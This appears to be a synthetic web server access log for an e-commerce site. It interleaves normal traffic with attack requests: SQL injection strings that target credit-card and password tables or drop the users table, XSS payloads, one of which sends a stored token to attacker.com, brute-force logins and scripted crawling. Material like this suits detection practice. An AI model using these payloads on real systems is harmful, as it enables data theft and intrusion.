192.168.1.11 - - [15/Jun/2025:00:41:52 +0000] "POST /api/orders HTTP/1.1" 200 7023 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:46:18 +0000] "POST /index.html HTTP/1.1" 200 744 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:32:01 +0000] "POST /api/orders HTTP/1.1" 201 7413 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:36:34 +0000] "GET /api/products?category=clothing HTTP/1.1" 304 4257 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:24:47 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:17:30 +0000] "POST /api/login HTTP/1.1" 401 183 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:45:35 +0000] "GET /images/banner.jpg HTTP/1.1" 200 6594 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.39 - - [15/Jun/2025:00:44:03 +0000] "POST /search?q=laptop HTTP/1.1" 200 5922 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:12 +0000] "GET /static/js/app.js HTTP/1.1" 429 2405 "-" "libwww-perl/6.72"
192.168.1.10 - - [15/Jun/2025:00:49:56 +0000] "GET /search?q=laptop HTTP/1.1" 200 1415 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.38 - - [15/Jun/2025:00:56:59 +0000] "GET /static/css/main.css HTTP/1.1" 404 4241 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:27:19 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 499 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:24:16 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 600 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:41:33 +0000] "GET /api/user/profile HTTP/1.1" 404 3068 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:59:58 +0000] "POST /api/user/profile HTTP/1.1" 201 1139 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:45:23 +0000] "GET /api/orders HTTP/1.1" 200 7831 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.34 - - [15/Jun/2025:00:39:25 +0000] "POST /favicon.ico HTTP/1.1" 200 4008 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:27:39 +0000] "GET /api/login?user=admin'-- HTTP/1.1" 400 314 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:52 +0000] "GET /index.html HTTP/1.1" 200 2834 "-" "python-requests/2.31.0"
45.152.66.201 - - [15/Jun/2025:00:28:41 +0000] "GET /favicon.ico HTTP/1.1" 200 2190 "-" "Go-http-client/1.1"
198.51.100.42 - - [15/Jun/2025:00:03:05 +0000] "POST /api/login HTTP/1.1" 401 237 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
172.16.0.55 - - [15/Jun/2025:00:26:35 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 542 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:05:43 +0000] "POST /api/login HTTP/1.1" 401 197 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.19 - - [15/Jun/2025:00:39:58 +0000] "GET /api/cart/add HTTP/1.1" 200 2549 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.33 - - [15/Jun/2025:00:46:01 +0000] "POST /contact HTTP/1.1" 200 2865 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:22:41 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 459 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:12:16 +0000] "POST /api/login HTTP/1.1" 401 190 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.43 - - [15/Jun/2025:00:40:32 +0000] "GET / HTTP/1.1" 200 7020 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:44:16 +0000] "POST /contact HTTP/1.1" 200 2493 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.12 - - [15/Jun/2025:00:41:43 +0000] "POST /api/cart/add HTTP/1.1" 200 849 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.40 - - [15/Jun/2025:00:50:25 +0000] "GET /static/css/main.css HTTP/1.1" 200 1265 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.77 - - [15/Jun/2025:00:22:57 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 536 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:35:33 +0000] "POST /contact HTTP/1.1" 201 7331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:12:42 +0000] "POST /api/login HTTP/1.1" 401 226 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:24:31 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 435 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.16 - - [15/Jun/2025:00:34:58 +0000] "GET /static/css/main.css HTTP/1.1" 200 4559 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.23 - - [15/Jun/2025:00:55:14 +0000] "GET /favicon.ico HTTP/1.1" 200 3571 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.49 - - [15/Jun/2025:00:34:51 +0000] "POST /static/css/main.css HTTP/1.1" 200 366 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:45 +0000] "GET /static/js/app.js HTTP/1.1" 200 3179 "-" "libwww-perl/6.72"
192.168.1.27 - - [15/Jun/2025:00:51:11 +0000] "GET /static/css/main.css HTTP/1.1" 200 4500 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:09:07 +0000] "POST /api/login HTTP/1.1" 401 213 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:55:17 +0000] "POST /favicon.ico HTTP/1.1" 200 261 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:09:53 +0000] "POST /api/login HTTP/1.1" 401 221 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.40 - - [15/Jun/2025:00:45:08 +0000] "GET /api/user/profile HTTP/1.1" 200 7538 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:32:49 +0000] "POST /contact HTTP/1.1" 200 5546 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.25 - - [15/Jun/2025:00:32:21 +0000] "GET /about HTTP/1.1" 404 1110 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.28 - - [15/Jun/2025:00:47:51 +0000] "POST /products HTTP/1.1" 201 2706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:25 +0000] "GET /search?q=laptop HTTP/1.1" 200 3771 "-" "Go-http-client/1.1"
192.168.1.10 - - [15/Jun/2025:00:41:44 +0000] "GET /about HTTP/1.1" 200 3906 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:55:35 +0000] "GET /checkout HTTP/1.1" 200 994 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.26 - - [15/Jun/2025:00:40:24 +0000] "POST /static/js/app.js HTTP/1.1" 201 4934 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.48 - - [15/Jun/2025:00:39:31 +0000] "POST /robots.txt HTTP/1.1" 201 7150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.39 - - [15/Jun/2025:00:42:38 +0000] "GET /search?q=laptop HTTP/1.1" 200 3361 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.40 - - [15/Jun/2025:00:41:05 +0000] "GET /index.html HTTP/1.1" 200 7369 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:48:00 +0000] "GET /robots.txt HTTP/1.1" 200 1615 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:18:17 +0000] "POST /api/login HTTP/1.1" 401 184 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:00:56 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.17 - - [15/Jun/2025:00:41:11 +0000] "POST /favicon.ico HTTP/1.1" 200 715 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:11:20 +0000] "POST /api/login HTTP/1.1" 401 184 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.49 - - [15/Jun/2025:00:34:38 +0000] "GET /api/orders HTTP/1.1" 200 7454 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.45 - - [15/Jun/2025:00:42:06 +0000] "GET /api/cart/add HTTP/1.1" 304 6047 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:18 +0000] "GET /about HTTP/1.1" 200 2458 "-" "libwww-perl/6.72"
198.51.100.42 - - [15/Jun/2025:00:27:27 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 338 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.26 - - [15/Jun/2025:00:42:49 +0000] "GET /contact HTTP/1.1" 404 2931 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:25 +0000] "GET /cart HTTP/1.1" 429 2500 "-" "python-requests/2.31.0"
192.168.1.19 - - [15/Jun/2025:00:44:06 +0000] "GET /api/cart/add HTTP/1.1" 200 6845 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.24 - - [15/Jun/2025:00:39:27 +0000] "POST /checkout HTTP/1.1" 201 2516 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [15/Jun/2025:00:50:09 +0000] "POST /checkout HTTP/1.1" 201 2005 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.14 - - [15/Jun/2025:00:29:04 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 5029 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:28:55 +0000] "GET /contact HTTP/1.1" 429 2988 "-" "Wget/1.21.4"
45.152.66.201 - - [15/Jun/2025:00:28:59 +0000] "GET / HTTP/1.1" 200 2707 "-" "Wget/1.21.4"
45.152.66.201 - - [15/Jun/2025:00:28:19 +0000] "GET /robots.txt HTTP/1.1" 200 2020 "-" "curl/8.5.0"
192.168.1.43 - - [15/Jun/2025:00:34:28 +0000] "GET /index.html HTTP/1.1" 200 4195 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:20:36 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:23:13 +0000] "GET /api/user?name=<svg/onload=fetch('//attacker.com/'+localStorage.token)> HTTP/1.1" 400 407 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:34:41 +0000] "GET /api/user/profile HTTP/1.1" 404 7101 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:42:44 +0000] "POST / HTTP/1.1" 200 5931 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.40 - - [15/Jun/2025:00:46:51 +0000] "POST /about HTTP/1.1" 200 7507 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:07:34 +0000] "POST /api/login HTTP/1.1" 401 205 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.36 - - [15/Jun/2025:00:44:32 +0000] "GET /favicon.ico HTTP/1.1" 200 2802 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.42 - - [15/Jun/2025:00:06:23 +0000] "POST /api/login HTTP/1.1" 401 209 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.24 - - [15/Jun/2025:00:49:49 +0000] "GET /robots.txt HTTP/1.1" 404 5248 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.34 - - [15/Jun/2025:00:41:42 +0000] "GET /static/css/main.css HTTP/1.1" 200 973 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:45 +0000] "GET /static/css/main.css HTTP/1.1" 200 1820 "-" "libwww-perl/6.72"
192.168.1.34 - - [15/Jun/2025:00:36:24 +0000] "GET /checkout HTTP/1.1" 200 1807 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:28:37 +0000] "GET /cart HTTP/1.1" 200 1738 "-" "curl/8.5.0"
192.168.1.10 - - [15/Jun/2025:00:50:50 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 521 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.30 - - [15/Jun/2025:00:38:03 +0000] "POST /api/user/profile HTTP/1.1" 200 5473 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.23 - - [15/Jun/2025:00:37:02 +0000] "POST /api/orders HTTP/1.1" 201 2899 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.39 - - [15/Jun/2025:00:36:50 +0000] "GET /cart HTTP/1.1" 200 3076 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.17 - - [15/Jun/2025:00:57:33 +0000] "POST /api/cart/add HTTP/1.1" 200 5850 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.36 - - [15/Jun/2025:00:41:10 +0000] "POST /static/css/main.css HTTP/1.1" 200 1078 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:28:47 +0000] "GET /about HTTP/1.1" 200 2035 "-" "python-requests/2.31.0"
192.168.1.24 - - [15/Jun/2025:00:45:01 +0000] "GET /favicon.ico HTTP/1.1" 404 1072 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:48:47 +0000] "GET /checkout HTTP/1.1" 200 1209 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:52:20 +0000] "POST /static/js/app.js HTTP/1.1" 201 712 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.39 - - [15/Jun/2025:00:32:56 +0000] "POST /favicon.ico HTTP/1.1" 200 6556 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.18 - - [15/Jun/2025:00:43:24 +0000] "GET /about HTTP/1.1" 200 4570 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
10.0.0.99 - - [15/Jun/2025:00:25:51 +0000] "GET /products?name=<img src=x onerror=alert(document.domain)> HTTP/1.1" 400 407 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:57:12 +0000] "GET /robots.txt HTTP/1.1" 404 4142 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:24:54 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.15 - - [15/Jun/2025:00:50:18 +0000] "POST /robots.txt HTTP/1.1" 201 3377 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [15/Jun/2025:00:47:32 +0000] "GET / HTTP/1.1" 200 2440 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.31 - - [15/Jun/2025:00:39:06 +0000] "POST /search?q=laptop HTTP/1.1" 200 1736 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.41 - - [15/Jun/2025:00:53:02 +0000] "GET /favicon.ico HTTP/1.1" 304 2875 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:18 +0000] "GET /static/js/app.js HTTP/1.1" 200 3198 "-" "python-requests/2.31.0"
192.168.1.18 - - [15/Jun/2025:00:34:09 +0000] "GET /static/css/main.css HTTP/1.1" 304 6171 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.35 - - [15/Jun/2025:00:29:24 +0000] "GET /cart HTTP/1.1" 304 6918 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:06:48 +0000] "POST /api/login HTTP/1.1" 401 209 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.49 - - [15/Jun/2025:00:35:17 +0000] "POST /images/banner.jpg HTTP/1.1" 200 1198 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.34 - - [15/Jun/2025:00:54:22 +0000] "POST /checkout HTTP/1.1" 200 6122 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.47 - - [15/Jun/2025:00:46:42 +0000] "POST /static/css/main.css HTTP/1.1" 201 3636 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:21:11 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 414 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:01:46 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.40 - - [15/Jun/2025:01:00:06 +0000] "POST /about HTTP/1.1" 201 2304 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
